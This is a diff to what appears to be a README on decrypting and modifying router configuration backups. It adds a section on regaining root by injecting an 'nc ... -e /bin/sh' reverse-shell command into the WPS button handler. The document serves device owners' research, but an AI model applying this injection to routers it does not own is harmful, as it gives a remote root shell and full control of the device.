@@ -103,6 +103,14 @@ SIGNATUREKEY=GW
 ```
 Here, IV is `c6b1c0aac15c13e5ab18a8aabafc14e0`, next goes encrypted data, 20 bytes at the end will be the signature
 
+## Getting back root access
+
+If your ISP updated the firmware and you are no longer able to exploit any public vulnerability to get root back, try to cahnge wps button handler, like:
+```
+button.wps.handler='nc 192.168.1.2 1337 -e /bin/sh || true'
+```
+Upload the config and pre WPS button - you should receive a remote shell with root access
+
 ## Python PoC
 
 to be uploaded
